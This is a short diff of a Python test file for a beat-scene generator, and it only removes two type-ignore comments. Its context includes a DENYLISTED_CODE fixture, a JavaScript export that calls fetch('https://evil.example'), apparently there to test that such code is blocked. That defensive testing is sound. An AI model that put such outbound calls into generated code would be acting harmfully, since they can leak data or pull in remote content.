@@ -19,7 +19,7 @@ DENYLISTED_CODE = (
     "export default (ctx) => { fetch('https://evil.example'); ctx.ready(); return {}; }"
 )
 
-SETTINGS = Settings(beat_model="claude-opus-4-8")  # type: ignore[call-arg]
+SETTINGS = Settings(beat_model="claude-opus-4-8")
 
 
 def _beat_plan() -> BeatPlan:
@@ -86,7 +86,7 @@ def test_wraps_client_errors() -> None:
     client = SimpleNamespace(messages=BoomMessages())
     with pytest.raises(BeatGenerationError, match="beat call failed"):
         generate_beat_scene(
-            client,  # type: ignore[arg-type]
+            client,
             SETTINGS,
             beat=_beat_plan(),
             lesson_id="l1",
